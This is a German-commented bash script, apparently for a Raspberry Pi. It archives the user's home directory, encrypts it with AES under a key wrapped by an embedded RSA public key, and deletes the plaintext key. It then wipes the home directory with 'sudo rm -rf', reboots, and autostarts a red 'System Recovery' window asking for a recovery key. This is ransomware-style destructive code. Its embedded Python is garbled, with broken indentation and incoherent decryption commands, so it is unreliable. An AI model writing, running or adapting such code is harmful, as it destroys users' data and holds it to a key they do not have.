#!/bin/bash

# 1. Backup erstellen und verschlüsseln
backup_file="$HOME/backup_$(date +%Y%m%d%H%M%S).tar.gz"
tar -czvf "$backup_file" $HOME/

# Verschlüsseln des Backups mit einem zufälligen AES-Schlüssel
openssl rand -base64 32 > "$HOME/secure_keys/aes_backup_key.txt"
aes_backup_key=$(cat "$HOME/secure_keys/aes_backup_key.txt")
openssl enc -aes-256-cbc -salt -in "$backup_file" -out "$backup_file.enc" -pass pass:"$aes_backup_key"
rm "$backup_file"

# AES-Schlüssel mit dem eingebetteten öffentlichen Schlüssel verschlüsseln
echo "<PUBLIC_KEY_PLACEHOLDER>" > "$HOME/secure_keys/public_key.pem"
openssl rsautl -encrypt -inkey "$HOME/secure_keys/public_key.pem" -pubin -in "$HOME/secure_keys/aes_backup_key.txt" -out "$HOME/secure_keys/encrypted_aes_backup_key.bin"
rm "$HOME/secure_keys/aes_backup_key.txt"
rm "$HOME/secure_keys/public_key.pem"

# Recovery-Programm erstellen
cat << 'EOF' > "$HOME/recovery_program.py"
#!/usr/bin/env python3
import os
import subprocess
import tkinter as tk
from tkinter import messagebox

def recover_system():
password = entry.get()
if not password:
	messagebox.showwarning("Warnung", "Bitte geben Sie ein Passwort ein.")
	return
	
	try:
	subprocess.run(f"openssl rsautl -decrypt -inkey <(echo \"$password\") -in $HOME/secure_keys/encrypted_aes_backup_key.bin -out $HOME/secure_keys/decrypted_aes_backup_key.txt", shell=True, check=True)
	with open("$HOME/secure_keys/decrypted_aes_backup_key.txt", 'r') as key_file:
	aes_key = key_file.read().strip()
	
	subprocess.run(f"openssl enc -d -aes-256-cbc -in $HOME/backup.enc -out $HOME/backup.tar.gz -pass pass:{aes_key}", shell=True, check=True)
	subprocess.run(f"sudo tar -xzvf $HOME/backup.tar.gz -C $HOME/", shell=True, check=True)
	
	messagebox.showinfo("Erfolg", "Das System wurde erfolgreich wiederhergestellt.")
	except subprocess.CalledProcessError:
	messagebox.showerror("Fehler", "Das Passwort ist falsch oder ein anderer Fehler ist aufgetreten.")
	
	def create_gui():
	root = tk.Tk()
	root.title("System Recovery")
	root.configure(bg="red")
	root.geometry("400x300")
	
	label = tk.Label(root, text="System Recovery", font=("Helvetica", 20), bg="red", fg="black")
	label.pack(pady=20)
	
	entry_label = tk.Label(root, text="Bitte geben Sie den Wiederherstellungsschlüssel ein:", bg="red", fg="white")
	entry_label.pack(pady=10)
	
	global entry
	entry = tk.Entry(root, show="*", font=("Helvetica", 14), width=30)
	entry.pack(pady=10)
	
	recover_button = tk.Button(root, text="Recover", command=recover_system, bg="brown", fg="white", font=("Helvetica", 14))
	recover_button.pack(pady=20)
	
	root.mainloop()
	
	if __name__ == "__main__":
		create_gui()
		EOF
		
		chmod +x "$HOME/recovery_program.py"
		
		# Werkseinstellungen wiederherstellen
		sudo rm -rf $HOME/*
		sudo apt-get --reinstall install raspberrypi-bootloader raspberrypi-kernel raspberrypi-ui-mods raspberrypi-sys-mods
		sudo apt-get purge --auto-remove -y
		
		# Recovery-Programm zum Autostart hinzufügen
		mkdir -p $HOME/.config/lxsession/LXDE-pi/
		echo "@/usr/bin/python3 $HOME/recovery_program.py" >> $HOME/.config/lxsession/LXDE-pi/autostart
		
		# System neu starten
		sudo reboot
		
